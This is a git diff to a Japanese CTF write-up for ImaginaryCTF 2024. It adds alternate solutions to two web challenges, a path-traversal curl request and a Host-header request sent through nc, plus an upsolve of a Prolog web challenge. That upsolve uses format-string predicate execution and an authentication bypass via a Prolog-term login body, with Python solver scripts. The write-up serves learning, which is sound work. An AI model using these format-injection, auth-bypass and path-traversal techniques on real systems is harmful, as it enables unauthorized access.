@@ -1,4 +1,4 @@
-# ImaginaryCTF 2024 Writeup
+# ImaginaryCTF 2024 Writeup & Upsolve
 
 ImaginaryCTF 2024（<https://ctftime.org/event/2396>）に参加しました。  
 金, 19 7月 2024, 19:00 UTC — 日, 21 7月 2024, 19:00 UTC
@@ -19,6 +19,8 @@ ImaginaryCTF 2024（<https://ctftime.org/event/2396>）に参加しました。
   - [The Amazing Race](#the-amazing-race)
   - [readme](#readme)
   - [readme2](#readme2)
+- [WEB（解けなかった問題）](#web解けなかった問題)
+  - [Pwning en Logique](#pwning-en-logique)
 
 <!-- /code_chunk_output -->
 
@@ -261,6 +263,12 @@ Nginxのバージョンは`1.22.1`でしたが、`\xA0`が使えることがわ�
 curl $'http://readme.chal.imaginaryctf.org/flag.txt\xa0'
 ```
 
+- 別解
+
+```sh
+curl --path-as-is 'http://readme.chal.imaginaryctf.org/flag.txt/.'
+```
+
 ### readme2
 
 249pts - 56 solves
@@ -366,3 +374,87 @@ ictf{just_a_funny_bug_in_bun_http_handling}
 
 3000番ポートのサーバへのリクエストにリクエストヘッダがそのまま反映されるのが救いでした。  
 フラグメッセージ的に想定解法ではなさそうな気がします。
+
+- 別解
+
+```sh
+printf 'GET /.. HTTP/1.0\r\nHost: fakehost/fla\tg.txt\r\n\r\n' | nc localhost 80
+```
+
+## WEB（解けなかった問題）
+
+### Pwning en Logique
+
+384 pts - 38 solves
+
+admin権限でログイン後、`/flag`にアクセスできればフラグがもらえるようです。  
+guest権限として、`guest:guest`でログインすることはできますが、`/frag`にはアクセスできません。  
+
+言語はPerlで書かれており、ソースコードが提供されていため確認します。  
+今回の問題で気になるのは以下の箇所です。
+
+- server\.pl（抜粋）
+
+```perl
+greet(Request) :-
+    http_session_data(username(Username)),
+    http_parameters(Request, [
+        greeting(Greeting, [default('Hello')]),
+        format(Format, [default('~w, ~w!')])
+    ]),
+    content_type,
+    format(Format, [Greeting, Username]).
+```
+
+`format`パラメータによって、形式を指定できるようになっています。  
+<https://www.swi-prolog.org/pldoc/doc_for?object=format/2>を参考にすると、`~@`を指定することで、関数を呼び出すことができるようです。
+
+今回の場合は以下のようにすると、関数を実行できます。
+
+```text
+/greet?greeting=<関数名>&format=~@,~w
+```
+
+- solver.py
+
+```py
+#!/usr/bin/env python3
+import requests
+
+URL = "http://localhost:8888"
+
+s = requests.session()
+r = s.post(f"{URL}/login", data={
+  "username": "guest",
+  "password": "guest"
+})
+r = s.get(f"{URL}/greet", params={
+    "greeting": "print_flag",
+    "format": "~@, ~w"
+})
+print(r.text)
+```
+
+関数名に`listing`を指定すると、プログラムとpretty print句を一覧表示できるため、それを使う方法もあるようです。
+<https://www.swi-prolog.org/pldoc/man?section=listing>
+
+- 別解
+
+Content-typeを`application/x-prolog`にした解法もあるようです。
+
+```py
+#!/usr/bin/env python3
+import requests
+
+URL = "http://localhost:8888"
+
+s = requests.session()
+r = s.post(
+  f"{URL}/login",
+  data="[username=admin, password=A].",
+  headers={
+      "Content-type": "application/x-prolog"
+  })
+r = s.get(f"{URL}/flag")
+print(r.text)
+```
